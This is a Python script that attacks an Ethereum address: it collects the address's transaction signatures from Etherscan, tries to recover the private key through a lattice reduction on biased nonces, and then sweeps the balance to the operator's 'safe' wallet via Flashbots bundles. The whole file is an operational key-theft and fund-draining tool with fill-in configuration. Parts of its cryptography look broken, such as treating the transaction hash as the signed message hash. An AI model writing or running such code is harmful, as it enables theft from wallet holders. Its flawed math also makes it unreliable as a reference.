import time
import requests
from web3 import Web3
from flashbots import flashbot
from eth_account import Account
from sage.all import Matrix, QQ

# --- MANDATORY CONFIGURATION ---
# Current Block Time: 2026-05-14 02:04 AM
CONFIG = {
    "RPC_URL": "YOUR_ETHEREUM_NODE_URL",
    "ETHERSCAN_KEY": "YOUR_API_KEY",
    "TARGET_ADDR": "0xVulnerableAddress",
    "SAFE_DEST": "0xYourSafeWalletAddress",
    "RELAY_SIGNER": "0xYourPrivateRelaySignerKey", # For Flashbots Auth
    "EXPECTED_BIAS": 128, # Bits of nonce leakage (top 128 bits are 0)
}

w3 = Web3(Web3.HTTPProvider(CONFIG["RPC_URL"]))
relay_acc = Account.from_key(CONFIG["RELAY_SIGNER"])
flashbot(w3, relay_acc)

def get_live_signatures(address):
    """Phase 1: Real-time Signature Harvesting"""
    print(f"[{time.strftime('%H:%M:%S')}] Scanning history for {address}...")
    api = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&sort=desc&apikey={CONFIG['ETHERSCAN_KEY']}"
    txs = requests.get(api).json().get('result', [])
    
    sigs = []
    for tx_data in txs:
        if len(sigs) >= 5: break
        tx = w3.eth.get_transaction(tx_data['hash'])
        if tx['from'].lower() == address.lower():
            r = int(tx['r'].hex(), 16)
            s = int(tx['s'].hex(), 16)
            h = int(tx_data['hash'], 16) # Approximate msg hash for 2026 legacy txs
            sigs.append((r, s, h))
    return sigs

def solve_lattice(sigs):
    """Phase 2: SageMath LLL Key Recovery"""
    n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
    m = len(sigs)
    matrix = Matrix(QQ, m + 2, m + 2)
    
    for i in range(m):
        r, s, h = sigs[i]
        r_inv = pow(r, -1, n)
        s_inv = pow(s, -1, n)
        matrix[i, i] = n
        matrix[m, i] = (r * s_inv) % n
        matrix[m + 1, i] = -(h * s_inv) % n

    matrix[m, m] = 1 / n
    matrix[m + 1, m + 1] = 1
    
    print(f"[{time.strftime('%H:%M:%S')}] Reducing Lattice...")
    for row in matrix.LLL():
        potential_key = int(row[m]) % n
        if potential_key != 0:
            acc = Account.from_key(hex(potential_key))
            if acc.address.lower() == CONFIG["TARGET_ADDR"].lower():
                return hex(potential_key)
    return None

def sweep_assets(priv_key):
    """Phase 3: Flashbots Secure Sweep"""
    target_acc = Account.from_key(priv_key)
    bal = w3.eth.get_balance(target_acc.address)
    if bal < w3.to_wei(0.01, 'ether'): return print("Insufficient balance.")

    tx = {
        'to': CONFIG["SAFE_DEST"],
        'value': bal - w3.to_wei(0.004, 'ether'), # 2026 Gas Margin
        'gas': 21000,
        'maxFeePerGas': int(w3.eth.gas_price * 2), # Aggressive for 2 AM window
        'maxPriorityFeePerGas': w3.to_wei(2, 'gwei'),
        'nonce': w3.eth.get_transaction_count(target_acc.address),
        'chainId': 1
    }

    signed = target_acc.sign_transaction(tx)
    bundle = [{"signed_transaction": signed.rawTransaction}]
    
    # Submit for the next 3 blocks
    current_block = w3.eth.block_number
    for b in range(1, 4):
        w3.flashbots.send_bundle(bundle, target_block_number=current_block + b)
        print(f"Bundle targeted for block {current_block + b}")

if __name__ == "__main__":
    found_sigs = get_live_signatures(CONFIG["TARGET_ADDR"])
    if len(found_sigs) >= 3:
        recovered_key = solve_lattice(found_sigs)
        if recovered_key:
            print(f"SUCCESS: Recovered Key {recovered_key}")
            sweep_assets(recovered_key)
        else:
            print("Lattice reduction failed to yield a key.")
    else:
        print("Not enough signatures found.")